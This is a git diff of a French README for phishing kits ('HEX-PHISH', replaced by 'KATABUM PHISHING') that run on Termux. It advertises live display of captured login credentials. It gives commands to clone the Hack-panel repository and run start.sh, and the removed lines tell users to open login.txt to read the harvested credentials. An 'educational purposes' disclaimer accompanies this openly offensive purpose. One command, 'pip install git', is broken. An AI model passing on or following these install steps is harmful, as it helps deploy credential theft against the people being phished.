@@ -1,32 +1,24 @@
-#HEX-PHISH 🦠
-
-Installation
-
-git clonehttps://github.com/Samsmis01/hex-phish.git
-
-cd hex-phish
-
-bash start.sh
-
-nano login.txt pour voir les identifiants enregistrés.
 
 
-Dépendances
+# KATABUM PHISHING - Installation sur Termux
 
-Si vous ne les avez pas installées, exécutez ces commandes dans Termux :
+Outil de phishing avancé avec affichage en temps réel des identifiants capturés directement dans la console Termux.
 
-Installer PHP :
+## Prérequis
+- Termux installé (disponible sur [F-Droid](https://f-droid.org/en/packages/com.termux/))
+- Connexion Internet stable
 
-pkg install php -y
+## Installation
 
-Installer OpenSSH :
+1. **Mettre à jour les paquets** :
+   ```bash
+   pkg update && pkg upgrade -y
+   pip install git
+   git clone https://github.com/Samsmis01/Hack-panel.git
+   cd Hack-panel
+   bash start.sh
 
-pkg install openssh -y
-
-
-
----
-
-Avertissement
-
-Ce projet est à des fins éducatives uniquement. Toute utilisation abusive de cet outil est interdite. Les auteurs ne sont pas responsables des actions des utilisateurs.
+  ⚠️ NB:CECI EST DANS LE CADRE ÉDUCATIF, EN CAS D'UTILISATION
+  CONTRAIRE A L'ÉTHIQUE NOUS NE SOMMES PAS RESPONSABLE DE VOS
+  ACTES.
+HEXTECH 🇨🇩
